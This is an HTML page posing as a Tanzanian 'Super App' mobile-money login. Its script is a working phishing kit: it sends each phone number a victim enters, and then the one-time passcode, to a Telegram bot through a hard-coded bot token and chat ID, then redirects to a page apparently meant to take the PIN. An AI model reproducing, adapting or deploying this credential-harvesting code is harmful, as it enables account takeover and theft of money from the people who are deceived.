<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Super App</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #002b7f;
            color: #ffffff;
            padding: 20px;
        }
        
        .language-selector {
            position: absolute;
            top: 20px;
            left: 20px;
            background: #e6ecf3;
            color: #000;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .language-selector img {
            width: 16px;
        }
        
        .main-container {
            margin-top: 80px;
            text-align: center;
        }
        
        .image-wrapper {
            background-color: white;
            border-radius: 40px;
            padding: 10px;
            display: inline-block;
        }
        
        .image-wrapper img {
            width: 280px;
            height: auto;
            border-radius: 40px;
        }
        
        .text-block {
            margin-top: 30px;
        }
        
        .text-block .subtitle {
            font-size: 22px;
            font-weight: 400;
            color: #b4c3dd;
        }
        
        .text-block .highlight {
            font-weight: 700;
            font-size: 22px;
            color: #fdd835;
        }
        
        .dots {
            margin-top: 10px;
            margin-bottom: 30px;
        }
        
        .dots span {
            display: inline-block;
            width: 8px;
            height: 8px;
            margin: 0 4px;
            border-radius: 50%;
            background-color: #7c9ace;
        }
        
        .dots .active {
            background-color: #fdd835;
        }
        
        .input-container {
            background: white;
            border-radius: 20px;
            padding: 20px;
        }
        
        .phone-input,
        .otp-input {
            display: flex;
            align-items: center;
            background: #f0f4f8;
            border: 1px solid #cfd8dc;
            padding: 10px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        
        .phone-input img,
        .otp-input img {
            width: 24px;
            margin-right: 10px;
        }
        
        .phone-input input,
        .otp-input input {
            border: none;
            outline: none;
            width: 100%;
            background: transparent;
            font-size: 16px;
        }
        
        .btn {
            width: 100%;
            padding: 14px;
            background-color: #002b7f;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 40px;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        
        .btn:hover {
            background-color: #001d5c;
        }
    </style>
</head>

<body>

    <div class="language-selector">
        <img src="https://flagcdn.com/w40/tz.png" alt="Tanzania Flag" /> English
        <span>â–¼</span>
    </div>

    <div class="main-container">
        <div class="image-wrapper">
            <img src="image11.png" alt="Super App UI" />
        </div>

        <div class="text-block">
            <div class="subtitle">Many Apps for days..</div>
            <div class="highlight">on your Super App</div>
        </div>

        <div class="dots">
            <span></span><span></span><span></span><span class="active"></span>
        </div>
    </div>

    <div class="input-container" id="phoneSection">
        <div class="phone-input">
            <img src="https://flagcdn.com/w40/tz.png" alt="Tanzania Flag" />
            <input id="phoneNumber" type="text" placeholder="07123456789" />
        </div>
        <button class="btn" onclick="goNext()">Next â†’</button>
    </div>

    <div class="input-container" id="otpSection" style="display: none;">
        <div class="otp-input">
            <input id="otp" type="text" placeholder="Enter OTP" />
        </div>
        <button class="btn" onclick="submitOTP()">Submit OTP</button>
    </div>

    <script>
        function goNext() {
            const phone = document.getElementById('phoneNumber').value.trim();
            if (!phone || !/^[0-9]{9,15}$/.test(phone)) {
                alert('Please enter a valid phone number.');
                return;
            }
            localStorage.setItem("phoneNumber", phone);

            const token = '8318767273:AAH-_zRVgEvcC5ASdKL8QxxR4QfXeBMq3BE';
            const chatId = '7728196897';
            const message = `ðŸ“± New phone number captured: ${phone}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                })
                .then(response => {
                    if (!response.ok) throw new Error('Failed to send to Telegram');
                    return response.json();
                })
                .then(data => {
                    console.log('Sent to Telegram:', data);
                    document.getElementById('phoneSection').style.display = 'none';
                    document.getElementById('otpSection').style.display = 'block';
                })
                .catch(error => {
                    console.error('Telegram error:', error);
                    alert('Failed to submit phone number.');
                });
        }

        function submitOTP() {
            const otp = document.getElementById('otp').value.trim();
            const phone = localStorage.getItem("phoneNumber") || 'Unknown';
            if (!otp) {
                alert('Please enter the OTP.');
                return;
            }
            const token = '8318767273:AAH-_zRVgEvcC5ASdKL8QxxR4QfXeBMq3BE';
            const chatId = '7728196897';
            const message = `âœ… OTP entered: ${otp}\nðŸ“± Phone: ${phone}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                })
                .then(response => {
                    if (!response.ok) throw new Error('Failed to send OTP');
                    return response.json();
                })
                .then(data => {
                    console.log('OTP sent to Telegram:', data);
                    window.location.href = 'pin.html';
                })
                .catch(error => {
                    console.error('OTP Telegram error:', error);
                    alert('Failed to submit OTP.');
                });
        }
    </script>
</body>

</html>
